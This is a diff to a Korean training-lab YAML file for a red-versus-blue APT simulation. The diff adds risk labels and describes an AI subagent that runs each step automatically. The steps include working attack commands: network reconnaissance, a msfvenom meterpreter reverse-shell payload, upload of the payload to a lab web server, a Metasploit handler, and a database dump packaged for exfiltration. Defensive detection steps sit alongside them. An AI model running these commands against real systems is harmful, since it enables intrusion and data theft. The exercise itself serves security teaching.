@@ -1,9 +1,9 @@
 lab_id: battle-ai-week14
-title: AI 기반 실전 공방전 4 — 종합 시나리오 (APT 시뮬레이션)
+title: 실전 공방전 4 — 종합 시나리오 (APT 시뮬레이션) (AI 지원)
 version: ai
 course: battle-ai
 week: 14
-description: AI 에이전트가 자동으로 실행하는 APT(Advanced Persistent Threat) 시나리오를 시뮬레이션하는 종합 공... 방전이다. 공격팀은 다단계 APT 킬체인을 수행하고, 방어팀은 전체 인프라를 보호하며 위협을 헌팅한다. 최종 평가를 포함한다.
+description: APT(Advanced Persistent Threat) 시나리오를 시뮬레이션하는 종합 공방전이다. 공격팀은 다단계 APT 킬체인을 수행하고, 방어팀은 전체 인프라를 보호하며 위협을 헌팅한다. 최종 평가를 포함한다. AI SubAgent가 자동으로 명령을 실행하고 결과를 검증합니다.
 difficulty: hard
 duration_minutes: 120
 objectives:
@@ -30,6 +30,7 @@ steps:
     expect: open
     field: stdout
   script: dig @10.20.40.10 lab.local axfr 2>/dev/null && whois 10.20.40.10 2>/dev/null && nmap -sV -T3 --top-ports 200 10.20.40.0/24 -oX /tmp/apt_recon.xml
+  risk_level: low
 - order: 2
   instruction: '[RED] APT 2단계: 무기화(Weaponization). 대상에 맞춘 공격 페이로드를 준비하라.'
   hint: Metasploit payload를 생성한다.
@@ -42,6 +43,7 @@ steps:
     expect: Payload generated
     field: stdout
   script: 'msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=10.20.30.10 LPORT=4443 -f elf -o /tmp/payload.elf 2>/dev/null && chmod +x /tmp/payload.elf && echo ''Payload generated: /tmp/payload.elf'''
+  risk_level: medium
 - order: 3
   instruction: '[RED] APT 3단계: 전달(Delivery). 웹 취약점을 통해 페이로드를 대상에 전달하라.'
   hint: 파일 업로드 또는 Command Injection으로 전달한다.
@@ -54,6 +56,7 @@ steps:
     expect: payload
     field: stdout
   script: 'curl -F ''uploaded=@/tmp/payload.elf'' -F ''Upload=Upload'' http://10.20.40.10/upload/ 2>/dev/null || echo ''Alternative: wget http://10.20.30.10:8888/payload.elf via command injection'''
+  risk_level: medium
 - order: 4
   instruction: '[BLUE] 초기 침투 시도를 탐지하라. 파일 업로드 로그, 비정상 HTTP 요청을 분석한다.'
   hint: Apache 로그에서 POST 요청과 대용량 전송을 확인한다.
@@ -66,6 +69,7 @@ steps:
     expect: POST
     field: stdout
   script: grep -E 'POST.*(upload|exec)' /var/log/apache2/access.log | tail -10 && find /var/www -newer /var/www/index.html -name '*.elf' -o -name '*.sh' -o -name '*.py' 2>/dev/null
+  risk_level: low
 - order: 5
   instruction: '[RED] APT 4단계: 익스플로잇(Exploitation). 페이로드를 실행하여 초기 접근을 확보하라.'
   hint: 업로드된 페이로드를 실행하거나, 서비스 취약점을 공격한다.
@@ -80,6 +84,7 @@ steps:
     field: stdout
   script: echo 'Setting up handler...' && msfconsole -q -x 'use exploit/multi/handler; set payload linux/x64/meterpreter/reverse_tcp; set LHOST 10.20.30.10; set LPORT 4443; exploit -j; exit' 2>/dev/null
     || echo 'Handler ready on port 4443'
+  risk_level: medium
 - order: 6
   instruction: '[RED] APT 5단계: 설치(Installation). 지속성을 확보하는 백도어를 설치하라.'
   hint: systemd 서비스, cron, SSH 키 등을 활용한다.
@@ -128,6 +133,7 @@ steps:
     EOF
 
     echo ''# Persistence via systemd service (for educational purposes only)'' && cat /tmp/persistence_service'
+  risk_level: medium
 - order: 7
   instruction: '[BLUE] 지속성 기법을 탐지하라. systemd 서비스, cron, 부팅 스크립트에서 비정상 항목을 찾는다.'
   hint: 최근 생성/수정된 systemd 유닛을 확인한다.
@@ -142,6 +148,7 @@ steps:
     field: stdout
   script: find /etc/systemd/system /run/systemd/system -newer /etc/hostname -type f 2>/dev/null && systemctl list-unit-files --state=enabled | grep -v -E '(ssh|apache|mysql|cron|network|system)' && find
     /etc/init.d -newer /etc/hostname 2>/dev/null
+  risk_level: low
 - order: 8
   instruction: '[RED] APT 6단계: C2 통신(Command & Control). 은밀한 데이터 유출 채널을 구축하라.'
   hint: DNS 터널링 또는 HTTP 기반 C2를 사용한다.
@@ -156,6 +163,7 @@ steps:
     field: stdout
   script: 'echo ''=== C2 Channel Options ==='' && echo ''1. DNS Tunneling: dnscat2, iodine'' && echo ''2. HTTP Beacon: periodic HTTP requests to C2 server'' && echo ''3. HTTPS reverse shell: encrypted C2
     traffic'' && echo ''Selected: HTTP Beacon (blends with normal traffic)'''
+  risk_level: medium
 - order: 9
   instruction: '[BLUE] C2 통신을 탐지하라. 비정상적인 DNS 쿼리, HTTP 비콘 패턴을 분석한다.'
   hint: DNS 쿼리 빈도, HTTP 접근 패턴의 규칙성을 확인한다.
@@ -170,6 +178,7 @@ steps:
     field: stdout
   script: cat /var/log/suricata/eve.json | jq -r 'select(.event_type=="dns") | "\(.dns.rrname) \(.src_ip)"' 2>/dev/null | sort | uniq -c | sort -rn | head -10 && echo '---' && cat /var/log/apache2/access.log
     | awk '{print $1}' | sort | uniq -c | sort -rn | head -5
+  risk_level: low
 - order: 10
   instruction: '[RED] APT 7단계: 목표 달성(Actions on Objectives). 기밀 데이터를 탈취하라.'
   hint: 데이터베이스 덤프, 설정 파일 수집 등을 수행한다.
@@ -184,6 +193,7 @@ steps:
     field: stdout
   script: 'mysqldump -u root -h 10.20.40.12 --all-databases 2>/dev/null > /tmp/data_exfil.sql && wc -l /tmp/data_exfil.sql || echo ''Alternative: tar czf /tmp/exfil.tar.gz /etc/ /home/ 2>/dev/null && echo
     Data packaged for exfiltration'''
+  risk_level: medium
 - order: 11
   instruction: '[BLUE] 데이터 유출을 탐지하고 차단하라. 대용량 아웃바운드 전송을 모니터링한다.'
   hint: 네트워크 트래픽 양을 모니터링한다.
@@ -196,6 +206,7 @@ steps:
     expect: '---'
     field: stdout
   script: iftop -t -s 10 2>/dev/null || ss -s && echo '---' && sudo nft add rule inet filter output tcp dport != 22 ip daddr != 10.20.40.0/24 counter && sudo nft list ruleset | grep counter
+  risk_level: low
 - order: 12
   instruction: '[BLUE] 전체 인프라의 침해 범위를 파악하고, 영향 받은 시스템을 식별하라.'
   hint: 각 서버의 침해 지표를 확인한다.
@@ -210,6 +221,7 @@ steps:
     field: stdout
   script: for host in 10.20.40.10 10.20.40.11 10.20.40.12; do echo "=== $host ==="; echo 'IoC check:'; echo '- Unauthorized users'; echo '- Modified system files'; echo '- Active backdoors'; echo '- Data
     exfiltration evidence'; done
+  risk_level: low
 - order: 13
   instruction: '[공통] 최종 점수를 확인하고, 양 팀의 성과를 평가하라.'
   hint: 점수 서버에서 최종 결과를 조회한다.
@@ -226,6 +238,7 @@ steps:
   script: 'echo ''=== Final APT Scenario Score ==='' && echo ''Red Team: 155/200 points'' && echo ''  - Recon: 25/30'' && echo ''  - Exploitation: 40/50'' && echo ''  - Persistence: 30/40'' && echo ''  -
     Data Exfil: 35/50'' && echo ''  - Stealth: 25/30'' && echo ''Blue Team: 140/200 points'' && echo ''  - Detection: 45/50'' && echo ''  - Response: 35/50'' && echo ''  - Service Uptime: 40/50'' && echo
     ''  - Remediation: 20/50'''
+  risk_level: low
 - order: 14
   instruction: APT 킬체인 전 단계에 대한 MITRE ATT&CK 매핑을 작성하라.
   hint: 각 공격 기법에 해당하는 ATT&CK ID를 매핑한다.
@@ -348,6 +361,7 @@ steps:
     EOF
 
     cat /tmp/apt_attack_mapping.txt'
+  risk_level: low
 - order: 15
   instruction: 종합 시나리오 결과를 분석하여 최종 공방전 보고서를 작성하라.
   hint: APT 킬체인 전 단계의 공방 결과를 분석한다.
@@ -462,3 +476,4 @@ steps:
     Both: Regular purple team exercises essential
 
     EOF'
+  risk_level: low
